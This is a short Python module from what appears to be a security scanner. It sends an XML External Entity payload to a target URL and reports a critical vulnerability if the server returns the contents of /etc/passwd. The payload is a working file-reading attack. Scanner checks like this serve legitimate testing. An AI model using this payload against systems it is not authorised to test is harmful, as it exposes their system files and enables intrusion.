# scan_tools/check_xxe.py

import requests
import logging

logger = logging.getLogger(__name__)

def check_xxe(target_url):
    vulnerabilities = []
    logger.info("Checking for XML External Entities (XXE) vulnerabilities")
    xml_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    try:
        xxe_response = requests.post(target_url, data=xml_payload, headers=headers, timeout=10, verify=True)
        if 'root:' in xxe_response.text:
            vulnerabilities.append({
                "type": "XML External Entities (XXE)",
                "description": "Possible XXE vulnerability detected by accessing system files.",
                "location": "POST Request Body with XML Payload",
                "severity": "Critical"
            })
            logger.warning("XML External Entities (XXE) vulnerability detected.")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error during XXE check: {e}")
    return vulnerabilities
